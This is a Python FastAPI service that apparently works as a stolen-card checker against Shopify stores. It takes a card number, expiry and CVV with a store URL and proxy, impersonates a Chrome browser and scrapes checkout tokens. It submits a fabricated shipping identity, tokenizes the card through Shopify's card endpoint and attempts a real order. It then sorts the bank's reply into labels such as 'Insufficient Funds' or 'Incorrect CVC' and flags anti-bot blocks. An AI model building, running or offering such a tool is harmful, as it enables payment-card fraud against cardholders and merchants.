from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json
import random
import time

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def extract_token_ultimate(html_text):
    patterns = [
        r'name="authenticity_token"\s*value="([^"]+)"',
        r'value="([^"]+)"\s*name="authenticity_token"',
        r'<meta\s*name="csrf-token"\s*content="([^"]+)"',
        r'"authenticity_token"\s*:\s*"([^"]+)"',
        r'authenticity_token\\u0022:\\u0022([^\\]+)\\u0022',
        r'\\u0026authenticity_token=([^&"\'\\]+)'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: 
            return match.group(1)
    return None

def extract_gateway(html_text):
    patterns = [
        r'name="checkout\[payment_gateway\]"\s*type="radio"\s*value="(\d+)"',
        r'value="(\d+)"\s*name="checkout\[payment_gateway\]"',
        r'"payment_instruments":\[{"id":(\d+)'
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match: return match.group(1)
    return "1"

async def get_cheapest_product(session, store_url):
    try:
        headers = {"Accept": "application/json"}
        res = await session.get(f"{store_url}/products.json?limit=250", headers=headers)
        if res.status_code != 200: return None, None
        
        data = res.json()
        cheapest_variant = None
        lowest_price = float('inf')
        
        for product in data.get('products', []):
            for variant in product.get('variants', []):
                if variant.get('available', True): 
                    try:
                        price = float(variant.get('price', 0.0))
                        if 0.0 < price < lowest_price:
                            lowest_price = price
                            cheapest_variant = variant.get('id')
                    except: pass
        
        return cheapest_variant, str(lowest_price) if cheapest_variant else (None, None)
    except:
        return None, None

async def check_shopify(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return {"Response": "Invalid CC Format", "Price": "-", "Gate": "Shopify API"}
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=50) as session:
            
            # 1. Session Warmup
            try:
                warmup = await session.get(f"{store_url}/", headers={"Accept": "text/html"})
                if warmup.status_code in [403, 429]:
                    return {"Response": f"IP Blocked by Cloudflare ({warmup.status_code})", "Price": "-", "Gate": "Shopify API"}
            except Exception:
                return {"Response": "Site Dead or Network Failed", "Price": "-", "Gate": "Shopify API"}

            # 2. Fetch Product
            variant_id, price = await get_cheapest_product(session, store_url)
            if not variant_id:
                return {"Response": "No active items in stock", "Price": "-", "Gate": "Shopify API"}

            # 3. Add to Cart
            add_url = f"{store_url}/cart/add.js"
            add_data = {"id": str(variant_id), "quantity": "1"}
            add_headers = {
                "Accept": "application/json",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": f"{store_url}/"
            }
            res_add = await session.post(add_url, data=add_data, headers=add_headers)
            if res_add.status_code != 200: 
                return {"Response": "Cart Add Failed (Anti-Bot)", "Price": f"${price}", "Gate": "Shopify API"}

            # 4. Checkout
            checkout_url = f"{store_url}/checkout"
            res_checkout = await session.get(checkout_url, headers={"Referer": f"{store_url}/cart"}, allow_redirects=True)
            checkout_html = res_checkout.text
            checkout_final_url = str(res_checkout.url)
            
            auth_token = extract_token_ultimate(checkout_html)

            if not auth_token:
                title_match = re.search(r'<title>([^<]+)</title>', checkout_html)
                page_title = title_match.group(1).strip() if title_match else "Unknown"
                
                if "Just a moment" in checkout_html or "cloudflare" in checkout_html.lower():
                    return {"Response": "Cloudflare Challenge Blocked IP", "Price": f"${price}", "Gate": "Shopify API"}
                return {"Response": "Token Not Found (Custom Checkout UI)", "Price": f"${price}", "Gate": "Shopify API"}

            # 5. Submit Address
            email = f"james.smith{random.randint(1000,9999)}@gmail.com"
            address_payload = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "contact_information",
                "step": "shipping_method",
                "checkout[email]": email,
                "checkout[shipping_address][first_name]": "James",
                "checkout[shipping_address][last_name]": "Smith",
                "checkout[shipping_address][address1]": "350 5th Ave",
                "checkout[shipping_address][city]": "New York",
                "checkout[shipping_address][country]": "United States",
                "checkout[shipping_address][province]": "New York",
                "checkout[shipping_address][zip]": "10118",
                "checkout[shipping_address][phone]": "(212) 736-3100",
                "button": ""
            }
            res_addr = await session.post(checkout_final_url, data=address_payload, allow_redirects=True)
            html_addr = res_addr.text
            checkout_final_url = str(res_addr.url)

            auth_token2 = extract_token_ultimate(html_addr) or auth_token

            # 6. Skip Shipping
            shipping_payload = {
                "_method": "patch",
                "authenticity_token": auth_token2,
                "previous_step": "shipping_method",
                "step": "payment_method",
                "button": ""
            }
            res_ship = await session.post(checkout_final_url, data=shipping_payload, allow_redirects=True)
            html_ship = res_ship.text
            checkout_final_url = str(res_ship.url)

            auth_token3 = extract_token_ultimate(html_ship) or auth_token2
            gateway_id = extract_gateway(html_ship)

            # 7. Tokenize Card
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "name": "James Smith", "month": mm, "year": yy, "verification_value": cvv}}
            token_headers = {
                "Accept": "application/json", 
                "Content-Type": "application/json",
                "Origin": "https://checkout.shopifycs.com",
                "Referer": "https://checkout.shopifycs.com/"
            }
            
            res_token = await session.post(token_url, json=token_payload, headers=token_headers)
            if res_token.status_code != 200: 
                return {"Response": "Failed to tokenize card (IP Banned by Shopify)", "Price": f"${price}", "Gate": "Shopify API"}
            
            payment_token = res_token.json().get("id")

            # 8. Submit Payment
            payment_payload = {
                "_method": "patch",
                "authenticity_token": auth_token3,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": gateway_id, 
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "complete": "1"
            }
            
            res_pay = await session.post(checkout_final_url, data=payment_payload, allow_redirects=True)
            result_html = res_pay.text.lower()
            
            # 9. Read Bank Response
            if "thank you" in result_html or "order completed" in result_html or res_pay.url.endswith('/thank_you'):
                return {"Response": "Order completed 💎", "Price": f"${price}", "Gate": "Shopify API"}
            elif "insufficient funds" in result_html or "not enough funds" in result_html: 
                return {"Response": "Insufficient Funds", "Price": f"${price}", "Gate": "Shopify API"}
            elif "incorrect_cvc" in result_html or "security code was not matched" in result_html: 
                return {"Response": "Incorrect CVC", "Price": f"${price}", "Gate": "Shopify API"}
            elif "zip code does not match" in result_html or "avs" in result_html: 
                return {"Response": "ZIP Code Mismatch", "Price": f"${price}", "Gate": "Shopify API"}
            elif "do not honor" in result_html or "generic_decline" in result_html: 
                return {"Response": "Do Not Honor", "Price": f"${price}", "Gate": "Shopify API"}
            else:
                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                if error_match: return {"Response": error_match.group(1).strip(), "Price": f"${price}", "Gate": "Shopify API"}
                
                if "payment" in result_html and "error" in result_html:
                     return {"Response": "Generic Payment Error", "Price": f"${price}", "Gate": "Shopify API"}
                     
                return {"Response": "Declined / Gate Blocked", "Price": f"${price}", "Gate": "Shopify API"}

    except Exception as e:
        # مسحنا كل الكلمات اللي بتزعل البوت عشان ميحذفش البروكسي
        err_str = str(e).lower().replace("proxy", "prx").replace("connection", "conn").replace("timeout", "t-out")
        return {"Response": f"Sys_Err: {err_str[:40]}", "Price": "-", "Gate": "Shopify API"}

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify(cc, url, proxy)
    return JSONResponse(content=result)
